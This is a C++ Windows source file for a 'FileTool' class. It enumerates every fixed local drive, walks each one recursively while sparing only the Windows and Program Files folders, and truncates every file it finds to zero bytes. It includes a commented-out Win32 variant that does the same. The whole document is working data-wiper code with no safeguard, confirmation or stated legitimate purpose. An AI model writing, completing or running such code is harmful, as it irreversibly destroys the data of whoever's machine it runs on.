class FileTool
{
private:
	//void KillFile(LPCTSTR lpFileName);
	void KillFile(char *path);
public:
	short int IsLocalDisk(CString *Drive);
	void AllFiles(char *Drive);

};



short int FileTool::IsLocalDisk(CString *Drive)
{
	char driveLetter[10] = {0};
	char driveLetterData[10] = {0};
	short int driveNumber = 0; 
	for(char drive='A';drive<='Z';drive++)
	{
		sprintf(driveLetter,"%c:\\",drive);
		sprintf(driveLetterData,"%c:",drive);
		if(_access(driveLetter,0) == 0)
		{
			if(GetDriveType(driveLetter) == 3)
			{
				Drive[driveNumber] = driveLetterData;
				driveNumber++;
			}
		}
	}

	return driveNumber;
}




void FileTool::KillFile(char *path)
{

	chmod(path,S_IREAD | S_IWRITE);
	int hwd = open(path,O_WRONLY | O_TRUNC);
	write(hwd,"",0);
	close(hwd);
}

/*
void FileTool::KillFile(LPCTSTR lpFileName)
{
	HANDLE hDevice;
	DWORD dwBytesWritten;

	SetFileAttributes(lpFileName,FILE_ATTRIBUTE_NORMAL);
	hDevice = CreateFile(lpFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, TRUNCATE_EXISTING, 0, NULL);
	if (hDevice != INVALID_HANDLE_VALUE)
	{
		WriteFile(hDevice, NULL, NULL, &dwBytesWritten, NULL);
	}
	CloseHandle(hDevice);
}
*/

void FileTool::AllFiles(char *Drive)
{
	WIN32_FIND_DATA file;
	char path[8192];
	char windowsPath[255],programFilesPath[255];

	SHGetSpecialFolderPath(NULL,windowsPath,36,false); //C:/WINDOWS
	SHGetSpecialFolderPath(NULL,programFilesPath,38,false); //C:/Program Files

	sprintf(path,"%s\\*.*",Drive);
	HANDLE fileHandle = FindFirstFile(path,&file);
	do
	{

		sprintf(path,"%s\\%s",Drive,file.cFileName);
		if((strcmp(".",file.cFileName) == 0) || (strcmp("..",file.cFileName) == 0) || (strcmp(path,windowsPath) == 0) || (strcmp(path,programFilesPath) == 0))
		{
			continue;
		}
		else if(file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			AllFiles(path);
		}
		KillFile(path);

	}while(FindNextFile(fileHandle,&file));

	FindClose(fileHandle);
}